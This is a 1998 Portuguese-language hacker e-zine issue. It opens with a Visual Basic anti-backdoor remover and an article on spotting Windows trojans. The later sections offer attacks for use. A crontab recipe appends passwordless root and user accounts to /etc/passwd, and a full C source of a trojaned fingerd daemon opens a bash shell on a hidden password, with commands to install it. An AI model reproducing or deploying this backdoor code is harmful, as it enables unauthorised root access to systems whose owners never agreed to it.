+PODE USAR  ISSO PARA FAZER CADA COISA.. :C )
+
+AI VAI UMA DICA....
+---==[  QUE TAL UM .BAT COM TUDO ISSO E DEPOIS TRANSFORMAR ELE EM .EXE ? ]==--
+
+                                     BY
+                                        HORIX
+
+_____________________________________________________________
+http://www.zipmail.com.br   O e-mail que vai aonde voce esta.
+
+Cronix: uoooooowww!!!
+-------------------------------------------------------------------------------
+Bom esse mes o assunto em pauta sao as Backdoors...muito utilizadas para
+estabelecer uma porta de entrada num servidor ou num micro qualquer estao
+sendo mah utilizada atraves da popularizacao do back orifice...
+Como ele tem o servidor e o cliente par windows sua disseminacao pela net
+foi enorme, e o caos, estah instalado....
+                                      Cronix
+===============================================================================
+ BACKORIFFICE e BACKDOORS I  *como limpa los *..... By Senna Spy
+
+------------------------------------------------------------------------------
+Nestes ultimos tempos e principalmente neste ano, temos visto muitas
+noticias sobre invasoes de micros, roubo de senhas, de informacoes sigilosas, 
+hackers, crackers, trojans, backdoors, etc ...
+Estas invasoes, geralmente, sao feitas por certos descuidos dos proprios usuarios,
+que executam programas dizendo que tem uma finalidade, mas que na verdade tem a
+unica opcao de liberar acesso e assim, deixar o micro disponivel para qualquer 
+pessoa.  Estes programas proprios para invasao sao conhecidos como Trojan ou
+Backdoor.
+A mais conhecida backdoor atualmente, eh a Back Orifice, devido a midia ter dado 
+uma atencao especial a ela, ou talvez por uma questao de marketing, porque sempre 
+que ocorre algum lancamento ou bug contra os sistemas operacionais da Microsoft, 
+eh noticia na certa.  
+Mas, nao pensem que backdoors estao disponiveis somente em ambientes Windows nao,
+qualquer sistema operacional, pode ser "vitima" de um programa de mesma finalidade.
+Mas backdoors existem a muito tempo e geralmente, com nomes que nada indiquem isto,
+dificultando sobre tudo, a remocao, principalmente, por usuarios leigos.
+Como exemplo, citamos algumas conhecidas e que estao disponiveis em muitos sites pela internet:  Back Orifice, Graffiti Explorer, Master Paradise, NetBus, The Mask Robot, 
+Sockets de Troie, WIN32X e WINRUN.
+Entao, devido ao fato do crescente numero de backdoors, neste mes, iremos construir
+um programa com a finalidade de remover todas as backdoors citadas acima.
+Pedimos a todos, que colaborem conosco, nos enviando novas backdoors para 
+incrementarmos o programa.  Estaremos sempre atentos a novos programas de invasao 
+e portanto, tentaremos sempre nos manter atualizados.
+
+Detalhes do funcionamento do programa:
+
+   Para o programa funcionar bem, devemos colocar ele de forma que se inicialize
+   automaticamente, e para simplificarmos e mantermos o Registry "limpo", iremos
+   aproveitar a pasta de inicializacao automatica ... apos o "EXE" gerado, basta 
+   copia-lo para a pasta WINDOWS\Menu Iniciar\Iniciar, isto, fara com que o programa
+   seja iniciado automaticamente pelo Windows, sem que o usuario tenha que interver.
+   A finalidade do programa, eh de ficar "vigiando" os dados no registry do Windows, 
+   quando ocorrer uma instalacao de um programa e este for uma das backdoors
+   conhecidas, ele simplesmente, emitira um aviso, fazendo a remocao automaticamente.
+   A maioria das backdoors, tem em comum, a gravacao de dados no registry, permitindo       assim, que o programa seja executado automaticamente, fazendo com que o usuario nem 
+   perceba sua existencia, nao perceba sua execucao e muito menos que seu computador 
+   esta sendo invadido.
+   Outra informacao interessante, eh que as backdoors, geralmente, se instalam na 
+   maquina do usuario, ocupando arquivos "EXE", que nada tem a ver com o nome original,
+   dificultando sua identificacao.
+   Para criar o programa, apenas marque-o logo abaixo e em seguida, salve-o em um
+   arquivo chamado de ANTIBACK.BAS, compile-o com Visual Basic 5 e copie o ANTIBACK.EXE
+   para a pasta WINDOWS\Menu Iniciar\Iniciar.   Pronto, isto permitira que seu Windows
+   fique livre das backdoors mais conhecidas.
+
+   Ate a proxima edicao ...
+
+
+Attribute VB_Name = "ANTIBACK"
+Option Explicit
+
+' Rotinas Diversas
+
+Declare Function GetSystemDirectory Lib "kernel32.dll" Alias "GetSystemDirectoryA" _ 
+                   (ByVal lpBuffer As String, ByVal nSize As Long) As Long
+
+Declare Function GetWindowsDirectory Lib "kernel32.dll" Alias "GetWindowsDirectoryA" _
+                   (ByVal lpBuffer As String, ByVal nSize As Long) As Long
+
+Declare Function ExitWindowsEx Lib "user32" _
+                   (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
+
+' Trabalhar com o Registry do Windows
+
+Public Const REG_SZ As Long = 1
+Public Const REG_BINARY As Long = 3
+Public Const REG_DWORD As Long = 4
+
+Public Const HKEY_CLASSES_ROOT = &H80000000
+Public Const HKEY_CURRENT_USER = &H80000001
+Public Const HKEY_LOCAL_MACHINE = &H80000002
+Public Const HKEY_USERS = &H80000003
+
+Public Const ERROR_NONE = 0
+Public Const ERROR_BADDB = 1
+Public Const ERROR_BADKEY = 2
+Public Const ERROR_CANTOPEN = 3
+Public Const ERROR_CANTREAD = 4
+Public Const ERROR_CANTWRITE = 5
+Public Const ERROR_OUTOFMEMORY = 6
+Public Const ERROR_INVALID_PARAMETER = 7
+Public Const ERROR_ACCESS_DENIED = 8
+Public Const ERROR_INVALID_PARAMETERS = 87
+Public Const ERROR_NO_MORE_ITEMS = 259
+Public Const KEY_ALL_ACCESS = &H3F
+Public Const REG_OPTION_NON_VOLATILE = 0
+   
+Public Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
+
+Public Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" _
+                           (ByVal hKey As Long, ByVal lpSubKey As String, _
+                            ByVal Reserved As Long, ByVal lpClass As String, _
+                            ByVal dwOptions As Long, ByVal samDesired As Long, _
+                            ByVal lpSecurityAttributes As Long, phkResult As Long, _
+                            lpdwDisposition As Long) As Long
+
+Public Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" _
+                            (ByVal hKey As Long, ByVal lpSubKey As String, _
+                             ByVal ulOptions As Long, ByVal samDesired As Long, _
+                             phkResult As Long) As Long
+
+Public Declare Function RegQueryValueExString Lib "advapi32.dll" Alias _
+                 "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, _
+                                     ByVal lpReserved As Long, lpType As Long, _
+                                     ByVal lpData As String, lpcbData As Long) As Long
+
+Public Declare Function RegQueryValueExLong Lib "advapi32.dll" Alias _
+                 "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, _
+                                     ByVal lpReserved As Long, lpType As Long, _
+                                     lpData As Long, lpcbData As Long) As Long
+
+Public Declare Function RegQueryValueExNULL Lib "advapi32.dll" Alias _
+                 "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, _
+                                     ByVal lpReserved As Long, lpType As Long, _
+                                     ByVal lpData As Long, lpcbData As Long) As Long
+
+Public Declare Function RegSetValueExString Lib "advapi32.dll" Alias "RegSetValueExA" _
+                 (ByVal hKey As Long, ByVal lpValueName As String, _
+                  ByVal Reserved As Long, ByVal dwType As Long, _
+                  ByVal lpValue As String, ByVal cbData As Long) As Long
+
+Public Declare Function RegSetValueExLong Lib "advapi32.dll" Alias "RegSetValueExA" _
+                 (ByVal hKey As Long, ByVal lpValueName As String, _
+                  ByVal Reserved As Long, ByVal dwType As Long, lpValue As Long, _
+                  ByVal cbData As Long) As Long
+
+Public Function SetValueEx(ByVal hKey As Long, sValueName As String, lType As Long, _
+                  vValue As Variant) As Long
+   
+   ' Declaracao de Variaveis
+   Dim lValue As Long
+   Dim sValue As String
+  
+   ' Verificacao
+   Select Case lType
+      Case REG_SZ
+           sValue = vValue & Chr$(0)
+           SetValueEx = RegSetValueExString(hKey, sValueName, 0&, lType, sValue, Len(sValue))
+      Case REG_DWORD
+           lValue = vValue
+           SetValueEx = RegSetValueExLong(hKey, sValueName, 0&, lType, lValue, 4)
+   End Select
+End Function
+
+Function QueryValueEx(ByVal lhKey As Long, ByVal szValueName As String, _
+                      vValue As Variant) As Long
+
+   On Error GoTo QueryValueExError
+   
+   ' Declaracao de Variaveis
+   Dim cch As Long
+   Dim lrc As Long
+   Dim lType As Long
+   Dim lValue As Long
+   Dim sValue As String
+   Dim nLoop As Long
+   Dim sBinaryString As String
+   
+   ' Determina o Tamanho e o Tipo de Dado a Ler
+   lrc = RegQueryValueExNULL(lhKey, szValueName, 0&, lType, 0&, cch)
+    
+   If lrc <> ERROR_NONE Then Error 5
+      
+   Select Case lType
+      ' Strings ...
+      Case REG_SZ:
+           sValue = String(cch, 0)
+           lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)
+            
+           If lrc = ERROR_NONE Then
+              vValue = Left$(sValue, cch - 1)
+           Else
+              vValue = Empty
+           End If
+      
+      ' DWORDS ...
+      Case REG_DWORD:
+           lrc = RegQueryValueExLong(lhKey, szValueName, 0&, lType, lValue, cch)
+           If lrc = ERROR_NONE Then vValue = lValue
+        
+      Case Else
+           ' Todos Outros Tipos de Dados Nao Suportados
+           lrc = -1
+   End Select
+
+QueryValueExExit:
+   QueryValueEx = lrc
+   Exit Function
+       
+QueryValueExError:
+   Resume QueryValueExExit
+
+End Function
+
+Public Sub CreateNewKey(sNewKeyName As String, lPredefinedKey As Long)
+   Dim hNewKey As Long
+   Dim lRetVal As Long
+  
+   lRetVal = RegCreateKeyEx(lPredefinedKey, sNewKeyName, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hNewKey, lRetVal)
+   RegCloseKey (hNewKey)
+End Sub
+
+Public Sub SetKeyValue(sKeyName As String, sValueName As String, vValueSetting As Variant, _
+                       lValueType As Long)
+
+   Dim lRetVal As Long
+   Dim hKey As Long
+  
+   lRetVal = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sKeyName, 0, KEY_ALL_ACCESS, hKey)
+   lRetVal = SetValueEx(hKey, sValueName, lValueType, vValueSetting)
+       
+   RegCloseKey (hKey)
+End Sub
+
+Public Sub SetKeyValue2(sKeyName As String, sValueName As String, _
+                        vValueSetting As Variant, lValueType As Long)
+
+   Dim lRetVal As Long
+   Dim hKey As Long
+  
+   lRetVal = RegOpenKeyEx(HKEY_USERS, sKeyName, 0, KEY_ALL_ACCESS, hKey)
+   lRetVal = SetValueEx(hKey, sValueName, lValueType, vValueSetting)
+       
+   RegCloseKey (hKey)
+End Sub
+
+Public Function QueryValue(sKeyName As String, sValueName As String) As String
+   Dim lRetVal As Long
+   Dim hKey As Long
+   Dim vValue As Variant
+  
+   lRetVal = RegOpenKeyEx(HKEY_LOCAL_MACHINE, sKeyName, 0, KEY_ALL_ACCESS, hKey)
+   lRetVal = QueryValueEx(hKey, sValueName, vValue)
+  
+   QueryValue = vValue
+   RegCloseKey (hKey)
+End Function
+
+Public Function QueryValue2(sKeyName As String, sValueName As String) As String
+   Dim lRetVal As Long
+   Dim hKey As Long
+   Dim vValue As Variant
+  
+   lRetVal = RegOpenKeyEx(HKEY_USERS, sKeyName, 0, KEY_ALL_ACCESS, hKey)
+   lRetVal = QueryValueEx(hKey, sValueName, vValue)
+  
+   QueryValue2 = vValue
+   RegCloseKey (hKey)
+End Function
+
+'
+' Funcao Principal
+'
+
+Public Sub Main()
+   On Error Resume Next
+
+   ' Declaracao de Variaveis
+   Dim cDiretorioSystem As String
+   Dim cDiretorioWindows As String
+   
+   Dim cPosicaoRegistry As String
+   Dim cBackDoor As String
+   Dim cTitulo As String
+   
+   Dim cBuffer As String * 255
+   
+   Dim lDarBoot As Boolean
+   Dim nResposta As Long
+   
+   Dim xRetorno As Variant
+   
+   ' Titulo
+   cTitulo = "Senna Spy Anti-BackDoor 1.0 - By 2801Megazine - Edicao 2, 1998"
+   
+   ' Mensagem
+   MsgBox cTitulo + " - Ativada"
+   
+   ' Obtem o Diretorio System do Windows
+   nResposta = GetSystemDirectory(cBuffer, Len(cBuffer))
+   cDiretorioSystem = Left(cBuffer, nResposta) + "\"
+     
+   ' Obtem o Diretorio do Windows
+   nResposta = GetWindowsDirectory(cBuffer, Len(cBuffer))
+   cDiretorioWindows = Left(cBuffer, nResposta) + "\"
+   
+   '
+   ' Verifica se Existem os Arquivos das BackDoor´s a Serem Eliminadas
+   '
+   
+   ' Aqui, a Exclusao da Back Orifice
+   cBackDoor = cDiretorioSystem + " .EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   ' Aqui, a Exclusao da NetBus
+   cBackDoor = cDiretorioWindows + "PATCH.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   ' Aqui, a Exclusao do Graffiti Explorer
+   cBackDoor = cDiretorioSystem + "EXPLORER.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+
+   ' Aqui, a Exclusao do Sockets de Troie
+   cBackDoor = cDiretorioSystem + "SOCKETS23.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+
+   cBackDoor = cDiretorioWindows + "SOCKETS23.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   ' Aqui, a Exclusao da The Mask Robot
+   cBackDoor = cDiretorioSystem + "MGADESKDLL.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   cBackDoor = cDiretorioSystem + "CSMCTRL32.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   cBackDoor = cDiretorioWindows + "RSRCLOAD.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+      
+   ' Aqui, a Exclusao da Master Paradise
+   cBackDoor = cDiretorioWindows + "SYSEDIT.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   cBackDoor = cDiretorioWindows + "KEYHOOK.DLL"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   ' Aqui, a Exclusao da WINRUN
+   cBackDoor = cDiretorioWindows + "WINRUN.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   cBackDoor = cDiretorioSystem + "WINRUN.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   ' Aqui, a Exclusao da WIN32X
+   cBackDoor = cDiretorioWindows + "WIN32X.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   cBackDoor = cDiretorioSystem + "WIN32X.EXE"
+   SetAttr cBackDoor, vbNormal
+   Kill cBackDoor
+   
+   ' Flag Para Controlar Se Deve Dar Boot no Micro ou Nao
+   lDarBoot = False
+   
+   '
+   ' Controla o Registry Infinitamente, a Fim de Dectectar Inclusoes
+   '
+   While True
+      DoEvents
+   
+      ' Verifica se o Back Orifice Esta Sendo Instalado Neste Momento
+      cPosicaoRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices"
+   
+      If UCase(QueryValue(cPosicaoRegistry, "")) = " .EXE" Then
+         SetKeyValue cPosicaoRegistry, "", "", REG_SZ
+      
+         MsgBox "ATENCAO:  Back Orifice Encontrado e Removido !", vbOKOnly, cTitulo
+         lDarBoot = True
+      End If
+      
+      ' Verifica se o NetBus Esta Sendo Instalado Neste Momento
+      cPosicaoRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+   
+      If UCase(QueryValue(cPosicaoRegistry, "PATCH")) = "PATCH.EXE" Then
+         SetKeyValue cPosicaoRegistry, "PATCH", "", REG_SZ
+         
+         MsgBox "ATENCAO:  NetBus Encontrado e Removido !", vbOKOnly, cTitulo
+         lDarBoot = True
+      End If
+      
+      ' Verifica se o Graffiti Explorer Esta Sendo Instalado Neste Momento
+      cPosicaoRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+   
+      If UCase(QueryValue(cPosicaoRegistry, "EXPLORER")) = "EXPLORER.EXE" Then
+         SetKeyValue cPosicaoRegistry, "EXPLORER", "", REG_SZ
+         
+         MsgBox "ATENCAO:  Graffiti Explorer Encontrado e Removido !", vbOKOnly, cTitulo
+         lDarBoot = True
+      End If
+      
+      ' Verifica se o The Mask Robot-1 Esta Sendo Instalado Neste Momento
+      cPosicaoRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+   
+      If UCase(QueryValue(cPosicaoRegistry, "Load RSRCLOAD")) <> "" Then
+         SetKeyValue cPosicaoRegistry, "Load RSRCLOAD", "", REG_SZ
+         
+         MsgBox "ATENCAO:  The Mask Robot-1 Encontrado e Removido !", vbOKOnly, cTitulo
+         lDarBoot = True
+      End If
+      
+      ' Verifica se o The Mask Robot-2 Esta Sendo Instalado Neste Momento
+      cPosicaoRegistry = ".Default\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+   
+      If UCase(QueryValue2(cPosicaoRegistry, "Load MGADESKDLL")) <> "" Then
+         SetKeyValue2 cPosicaoRegistry, "Load MGADESKDLL", "", REG_SZ
+         
+         MsgBox "ATENCAO:  The Mask Robot-2 Encontrado e Removido !", vbOKOnly, cTitulo
+         lDarBoot = True
+      End If
+      
+      ' Verifica se o Master Paradise Esta Sendo Instalado Neste Momento
+      cPosicaoRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+   
+      If UCase(QueryValue(cPosicaoRegistry, "SYSEDIT")) = "SYSEDIT.EXE" Then
+         SetKeyValue cPosicaoRegistry, "SYSEDIT", "", REG_SZ
+         
+         MsgBox "ATENCAO:  Master Paradise Encontrado e Removido !", vbOKOnly, cTitulo
+         lDarBoot = True
+      End If
+      
+      ' Verifica se o WIN32X Esta Sendo Instalado Neste Momento
+      cPosicaoRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+   
+      If UCase(QueryValue(cPosicaoRegistry, "WIN32X")) <> "" Then
+         SetKeyValue cPosicaoRegistry, "WIN32X", "", REG_SZ
+         
+         MsgBox "ATENCAO:  WIN32X Encontrado e Removido !", vbOKOnly, cTitulo
+         lDarBoot = True
+      End If
+      
+      ' Verifica se o WINRUN Esta Sendo Instalado Neste Momento
+      cPosicaoRegistry = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+   
+      If UCase(QueryValue(cPosicaoRegistry, "WINRUN")) <> "" Then
+         SetKeyValue cPosicaoRegistry, "WINRUN", "", REG_SZ
+         
+         MsgBox "ATENCAO:  WINRUN Encontrado e Removido !", vbOKOnly, cTitulo
+         lDarBoot = True
+      End If
+      
+      ' Necessario dar Boot ?
+      If lDarBoot Then
+         MsgBox "Sera Necessario Resetar o Sistema !", vbOKOnly, cTitulo
+         
+         ' Reseta
+         xRetorno = ExitWindowsEx(67, 0)
+      End If
+   Wend
+End Sub
+
+==========[corte aki]=====================================================================
+Cronix:eh isso ae Senna...mandou bem :)
+
+------------------------------------------------------------------------------------------
+
+BACKDOORS II  *informativo*  By Vampire Hunter
+------------------------------------------------------------------------------------------
+              
+
+	Nas ultimas semanas tem crescido na Internet, o numero de computadores contaminados
+por Trojans Horses, ou Cavalos de Troia. Mas o que seria um cavalo de troia? Na informatica,
+Cavalo de Troia significa um programa implantado no seu computador, que abre uma Backdoor,
+ou Porta dos fundos no seu computador para que outra pessoa o invada.
+
+	O esquema de portas eh o seguinte, para cada conexao que voce fizer, seu computador
+abre uma porta. Por  exemplo,  o ICQ,  para  conectar na Mirabilis abre uma porta. Cada membro
+da sua lista  que te  enviar uma   mensagem, ele irah  abrir uma porta para receber a mensagem.
+
+	Ou seja, pra cada conexao seu computador abre uma porta, que recebe e envia dados. No
+caso, os  Trojans  abrem  uma porta  no  seu computador,  atravez  de  um  programa  que fica
+residente em memoria e, a pessoa que te passou usara um programa cliente para ter acesso ao
+seu computador. Dados no seu disco rigido, aos programas que estao abertos, chats, mensagens
+do ICQ e muito mais!.
+
+	Mas, como que eu posso ser contaminado por um Trojan? Lembra daquele programinha
+que um conhecido do ICQ te passou, mas que vocw o rodou e nao aconteceu nada? Ou aquele
+joguinho divertido, de jogar torta na cara do Bill Gaytes? Sim, nao se pode confiar em ninguem.
+Acredite se quiser, mas uma mina ja tentou me passar um Trojan. Alias uma loira de olhos azuis
+gaucha. =)
+
+	A sede por invadir a privacidade dos outros esta virando a cabeca das pessoas. A melhor maneira de nao ser contaminado, eh se prevenir (nao esqueca da camisinha tambem =) ). 
+
+	Nao aceite programas de pessoas que voce nao tenha total confianca, inclusive mulheres.
+Nao aceite joguinhos de outras pessoas, mesmo aquelas que voce PENSA que sao seus amigos.
+Quando aceitar, veja sempre as propiedades do programa, veja se a versao  de uma empresa
+idonea. Tomando certos cuidados voce evita muita dor de cabeca.
+
+	Mas como saber se eu to contaminado? Bom, eu conheco 4 tipos de Trojans, e vou
+explicar como voce pode se livrar dos 3. Basta voce escolher abaixo qual deseja ver.
+Recomendo que voce veja todos.
+
+
+******Trojan do ICKILLER********
+
+
+	Se voce ja usou o programa ICKILLER, pode ter certeza que voce esta contaminado. Esse
+programa vem com um backdoor. Ele se instala da seguinte maneira:
+
+	O Windows 95 e 98 usam um programa chamado explorer.exe, que eh o sistema operacional
+em si. Esse programa fica em:
+
+C:\WINDOWS\EXPLORER.EXE
+
+	O ICKILLER, cria um explorer.exe dentro do diretorio:
+
+C:\WINDOWS\SYSTEM\EXPLORER.EXE
+
+	Voce percebe, quando voce aperta Ctrl+Alt+Del uma vez e na listagem de programas tem
+mais de um explorer.exe aberto.
+
+	Para se livrar do Trojan, voce deve apagar o arquivo explorer.exe dentro do diretorio:
+
+C:\WINDOWS\SYSTEM\EXPLORER.EXE
+
+	Pronto! Seu computador nao tem mais o Trojan do ICKILLER.
+
+
+
+******Trojan de Games********
+
+	O Trojan que vem com os games eh muito facil de ser detectado e retirado.
+
+	Simplesmente pressione Ctrl+Alt+Del uma vez. Veja se do nada o programa sysedit esta
+aberto. Se estiver, feche=o e apague o arquivo:
+
+C:\WINDOWS\SYSEDIT.EXE
+
+	NAO APAGUE O ARQUIVO:
+
+C:\WINDOWS\SYSTEM\SYSEDIT.EXE
+
+	APAGUE O:
+
+C:\WINDOWS\SYSEDIT.EXE
+
+	Pronto, seu computador nao tem mais o backdoor dos joguinhos.
+
+
+
+******Back Orifice e Netbus********
+
+	Use o programa AntiBackdoors.com que vem com o ZIP do 2801 Megazine.
+
+
+______________________________
+
+	Se voce nao achou nenhum dos trojans acima no seu computador, parabens! Voce eh mesmo um felizardo (ou sortudo :P). Agora, se voce achou..... tsk, tsk..... =))
+
+
+
+===================================================================================================
+Crontab ,vixe o q eh isso?
+
+Bom a uns dias atras eu precisava saber como se explorar o Crontab....
+e comecei a ler textos e tal e aprendi usar esse treco ;)
+Nao para o q eu queria mas, tudo bem :(
+mas e o q eh Crontab?Eu vou explicar rapidamente e depois vai um exemplo pra voces..
+caso jah saiba o q eh,apenas de uma olhada no exemplo!!
+
+Crontab-->Esse comando permite q se programe tarefas fixas a serem executadas,
+em qualquer periodo de data uma ou varias tarefas/programas..
+
+uso: crontab [-?] [nome_do_usuario] [arquivo]
+
+sendo seus parametros: -l = exibe programacao do usuario atual
+                       -r = remove a programacao do usuarioa atual
+entao seu formato eh assim:
+
+-sao 6 campos separados por tab
+1-minuto
+2-hora
+3-dia do mes
+4-mes
+5-dia da semana (0=domingo)
+6-tarefa e ou script a ser executado....
+
+EXEMPLO:
+No nosso exemplo vamos executar uma backdoor entre 1 am e 2 am com duas contas
+a do Cronix usuario normal e a do megazine q eh root
+-----------------------------------------------------------------------------
+
+0 1 * * * chmod +w /etc/passwd
+1 1 * * * echo "Cronix::1:1::/:/bin/sh" >> /etc/passwd
+2 1 * * * echo "megazine::0:0::/:/bin/sh" >> /etc/passwd
+20 1 * * * grep -v "prop*:" /etc/passwd > /usr/spool/uucppublic/.p
+0 2 * * * cat /usr/spool/uucppublic/.p > /etc/passwd
+10 2 * * * chmod -w /etc/passwd
+15 2 * * * rm /usr/spool/uucppublic/.p
+------------------------------------------------------------------------------
+Claro q vc pode altera lo pondo o nome dos users q vc quiser, espero q tenham
+gostado....
+
+Fingtrojan.c
+^^^^^^^^^^^^
+Retirado do rwx 04 eu achei um belo trojan ...
+Basta trocar o /usr/sbin/in.fingered pelo trojan propriamente dito, o q
+deixa muuuito dificil do root perceber a instalacao dessa backdoor em seu
+sistema,pois ele nao soh subistitue o in.fingered como abre uma backdoor
+
+Blah@root:~# gcc -o in.fingered infingered
+Blah@root:~# mv in.fingered /usr/sbin
+
+bom o fonte estah ae com os creditos e tal
+
+---------[corte]--------------------------------------------------------------
+
+/*  The Fingerd trojan by Hitman Italy
+ *  This source cannot be spread without the whole article
+ *  but you can freely implement or modify it for personal use
+ *  [========================================================]
+ *  Modificado por X-SaTaNiC, Kbyte , soft , AnArChY
+ *  Devico bugs encontrados que fazia com que naum compilasse e a
+ *  backdoor da shell nao executasse direito.
+ *  Mas depois de tantas modificacoes esta ai trojan rodando blz!
+**  */  
+
+
+static char copyright[] = "";   /* Copyright String  */
+
+static char sccsid[] = "";      /* Sccsid String     */
+#define SENHA "rlz"             /* SENHA A SER USADA */
+
+#include <stdio.h>
+
+#define PATH_FINGER "/usr/bin/finger" /* DIRETORIO DO FINGER, cliente */
+#define CODE 161
+
+char *HitCrypt(ch)
+char *ch;
+{
+   char *b;
+   b=ch;
+   while ((*(ch++)^=CODE)!=0x00);
+   return(b);
+}
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+   register FILE *fp;
+   register int ch;
+   register char *lp;
+   int p[2];
+
+static char exor[4][23]={
+{201,200,213,CODE},
+{142,196,213,194,142,209,192,210,210,214,197,CODE},
+{201,200,213,155,155,145,155,145,155,155,142,155,142,195,200,207,142,194,
+210,201,CODE},
+{227,192,194,202,197,206,206,211,129,192,194,213,200,215,192,213,196,197,
+143,143,143,CODE} };
+
+#define   ENTRIES   50
+   char **ap, *av[ENTRIES + 1], line[1024], *strtok();
+
+#ifdef LOGGING               /* unused, leave it for "strings" command */
+#include <netinet/in.h>
+   struct sockaddr_in sin;
+   int sval;
+
+sval = sizeof(sin);
+   if (getpeername(0, &sin, &sval) < 0)
+      fatal(argv[0],"getpeername");
+#endif
+
+   if (!fgets(line, sizeof(line), stdin))
+      exit(1);
+
+av[0] = "finger";
+
+   for (lp = line, ap = &av[1];;) {
+      *ap = strtok(lp, " \t\r\n");
+      if (!*ap){
+         break;}
+      if ((*ap)[0] == '/' && ((*ap)[1] == 'W' || (*ap)[1] == 'w'))
+         *ap = "-l";
+      if (++ap == av + ENTRIES)
+         break;
+      lp = NULL;
+   }
+
+   if (pipe(p) < 0)
+
+  fatal(argv[0],"pipe");
+   if (!strcmp(line,SENHA)) {
+   system("/bin/bash -i");
+   exit(0);
+   }
+   switch(fork()) {
+   case 0:
+      (void)close(p[0]);
+      if (p[1] != 1) {
+         (void)dup2(p[1], 1);
+         (void)close(p[1]);
+      }
+
+         if (execv(PATH_FINGER, av)==-1)
+         fprintf(stderr,"No local finger program found\n");
+      _exit(1);
+   case -1:
+      fatal(argv[0],"fork");
+   }
+   (void)close(p[1]);
+   if (!(fp = fdopen(p[0], "r")))
+      fatal(argv[0],"fdopen");
+   while ((ch = getc(fp)) != EOF) {
+     putchar(ch);
+   }
+   exit(0);
+}
+
+fatal(prg,msg)
+   char *prg,*msg;
+{
+   fprintf(stderr, "%s: ", prg);
+   perror(msg);
+   exit(1);
+}
+
+------------[cabou aki]----------------------------------------------------------------
+Bom mes q vem tem mais sobre o assunto....pois isso ainda nao foi nem o comeco!
+=======================================================================================
+                                 ______________________
+                                  Consideracoes Finais
+                                 ----------------------
+ Bom eh isso ae esse numero alguns members nao escreveram mas escreverao no
+numero q vem...tivemos muitas materias q ficaram de fora,pois o Mg03 sairah
+logo mais...eh isso ae ateh mais...
+     Esperamos q tenha gostado a final esse zine eh feito para vcs....
+qualquer duvidas mail to us!! 
+   
+                                                             [fim no Mg02]
